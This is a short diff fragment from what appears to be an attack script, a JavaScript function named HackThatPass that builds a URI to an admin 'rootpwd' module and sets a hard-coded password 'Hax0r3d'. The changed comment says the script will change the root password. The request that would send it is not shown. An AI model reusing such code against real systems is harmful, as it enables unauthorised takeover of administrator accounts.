@@ -26,7 +26,7 @@ function HackThatPass()
 	var token = pathArray[1];
 	var uri = "/"+ token + "/admin/index.php?module=rootpwd";
 
-	// The following domain will be added as an Administrator level user
+	// We will change the root password to Hax0r3d
 	var password  = "Hax0r3d";
 
 
